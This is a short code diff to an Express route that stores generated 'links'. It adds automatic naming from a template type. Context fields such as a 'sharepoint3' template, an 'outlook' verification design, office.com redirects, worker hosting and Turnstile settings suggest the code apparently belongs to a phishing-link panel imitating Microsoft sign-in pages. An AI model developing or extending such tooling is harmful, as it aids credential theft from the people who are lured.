@@ -129,6 +129,11 @@ router.post('/', userAuth, async (req, res) => {
       }
     }
 
+    // Auto-generate name from template_type if not provided
+    const generatedName = template_type 
+      ? `${template_type.charAt(0).toUpperCase() + template_type.slice(1).replace(/[0-9]/g, '')} Link` 
+      : 'Untitled';
+    
     const [result] = await db.query(
       `INSERT INTO links
        (user_id, name, worker_name, template_type, verification_design, auth_mode,
@@ -137,7 +142,7 @@ router.post('/', userAuth, async (req, res) => {
         background_blur, blob_url_enabled, copy_to_open, turnstile_enabled, custom_bg_url)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
       [
-        req.user.id, name || 'Untitled', uniqueWorkerName, template_type || 'sharepoint3',
+        req.user.id, name || generatedName, uniqueWorkerName, template_type || 'sharepoint3',
         verification_design || 'outlook', auth_mode || 'token',
         destination_url || 'https://office.com', custom_domain || null,
         url_type || 'worker', domain_connection || 'subdomain', route_name || null,
